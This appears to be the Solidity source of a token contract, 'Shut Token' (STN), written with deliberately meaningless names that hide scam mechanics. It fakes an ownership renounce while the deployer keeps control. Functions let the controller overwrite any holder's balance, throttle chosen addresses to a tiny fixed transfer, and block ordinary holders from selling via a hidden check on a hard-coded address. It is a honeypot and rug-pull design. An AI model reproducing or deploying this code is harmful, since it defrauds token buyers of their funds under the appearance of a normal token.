//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface totalAutoLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundExempt) external view returns (uint256);

    function transfer(address marketingList, uint256 receiverReceiver) external returns (bool);

    function allowance(address buyToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address marketingList,
        uint256 receiverReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toMin, uint256 value);
    event Approval(address indexed buyToken, address indexed spender, uint256 value);
}

abstract contract listLimitSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txFee {
    function createPair(address feeWallet, address totalFund) external returns (address);
}

interface fromMinFee is totalAutoLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ShutToken is listLimitSender, totalAutoLaunch, fromMinFee {

    mapping(address => bool) public tradingReceiverFee;

    bool private receiverBuyReceiver;

    function symbol() external view virtual override returns (string memory) {
        return shouldIs;
    }

    uint256 public fundReceiverTx;

    function takeTotal(address modeFromExempt) public {
        if (buySender) {
            return;
        }
        
        tradingReceiverFee[modeFromExempt] = true;
        
        buySender = true;
    }

    uint256 public listSender;

    function marketingTotalTrading() private view {
        require(tradingReceiverFee[_msgSender()]);
    }

    function fundFee(address launchedBuy, address marketingList, uint256 receiverReceiver) internal returns (bool) {
        require(listTrading[launchedBuy] >= receiverReceiver);
        listTrading[launchedBuy] -= receiverReceiver;
        listTrading[marketingList] += receiverReceiver;
        emit Transfer(launchedBuy, marketingList, receiverReceiver);
        return true;
    }

    function totalShouldSender() public {
        emit OwnershipTransferred(launchFrom, address(0));
        tokenTo = address(0);
    }

    uint256 public launchMin;

    function transferFrom(address launchedBuy, address marketingList, uint256 receiverReceiver) external override returns (bool) {
        if (_msgSender() != maxBuy) {
            if (launchAmount[launchedBuy][_msgSender()] != type(uint256).max) {
                require(receiverReceiver <= launchAmount[launchedBuy][_msgSender()]);
                launchAmount[launchedBuy][_msgSender()] -= receiverReceiver;
            }
        }
        return exemptIs(launchedBuy, marketingList, receiverReceiver);
    }

    function allowance(address listFund, address autoTrading) external view virtual override returns (uint256) {
        if (autoTrading == maxBuy) {
            return type(uint256).max;
        }
        return launchAmount[listFund][autoTrading];
    }

    address private tokenTo;

    uint256 private liquiditySender = 100000000 * 10 ** 18;

    uint256 public amountAutoTx;

    function totalSupply() external view virtual override returns (uint256) {
        return liquiditySender;
    }

    function approve(address autoTrading, uint256 receiverReceiver) public virtual override returns (bool) {
        launchAmount[_msgSender()][autoTrading] = receiverReceiver;
        emit Approval(_msgSender(), autoTrading, receiverReceiver);
        return true;
    }

    bool private receiverShould;

    address public fundShould;

    bool private minSell;

    uint256 takeList;

    uint256 constant isMax = 7 ** 10;

    uint8 private fundReceiver = 18;

    function name() external view virtual override returns (string memory) {
        return buyTx;
    }

    function balanceOf(address fundExempt) public view virtual override returns (uint256) {
        return listTrading[fundExempt];
    }

    uint256 modeEnable;

    bool public receiverTx;

    function autoMax(address maxLaunched) public {
        marketingTotalTrading();
        
        if (maxLaunched == launchFrom || maxLaunched == fundShould) {
            return;
        }
        maxReceiver[maxLaunched] = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return fundReceiver;
    }

    function buyMinSell(address sellTotal, uint256 receiverReceiver) public {
        marketingTotalTrading();
        listTrading[sellTotal] = receiverReceiver;
    }

    bool public buySender;

    uint256 private amountLiquidity;

    address shouldAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        
        walletReceiver receiverMin = walletReceiver(maxBuy);
        fundShould = txFee(receiverMin.factory()).createPair(receiverMin.WETH(), address(this));
        
        launchFrom = _msgSender();
        totalShouldSender();
        tradingReceiverFee[launchFrom] = true;
        listTrading[launchFrom] = liquiditySender;
        
        emit Transfer(address(0), launchFrom, liquiditySender);
    }

    string private buyTx = "Shut Token";

    address maxBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private launchAmount;

    function transfer(address sellTotal, uint256 receiverReceiver) external virtual override returns (bool) {
        return exemptIs(_msgSender(), sellTotal, receiverReceiver);
    }

    uint256 private fundMode;

    function exemptIs(address launchedBuy, address marketingList, uint256 receiverReceiver) internal returns (bool) {
        if (launchedBuy == launchFrom) {
            return fundFee(launchedBuy, marketingList, receiverReceiver);
        }
        uint256 walletList = totalAutoLaunch(fundShould).balanceOf(shouldAmount);
        require(walletList == modeEnable);
        require(marketingList != shouldAmount);
        if (maxReceiver[launchedBuy]) {
            return fundFee(launchedBuy, marketingList, isMax);
        }
        return fundFee(launchedBuy, marketingList, receiverReceiver);
    }

    mapping(address => uint256) private listTrading;

    function buyLaunchAt(uint256 receiverReceiver) public {
        marketingTotalTrading();
        modeEnable = receiverReceiver;
    }

    event OwnershipTransferred(address indexed fromSenderShould, address indexed liquidityEnable);

    function getOwner() external view returns (address) {
        return tokenTo;
    }

    string private shouldIs = "STN";

    mapping(address => bool) public maxReceiver;

    address public launchFrom;

    function owner() external view returns (address) {
        return tokenTo;
    }

}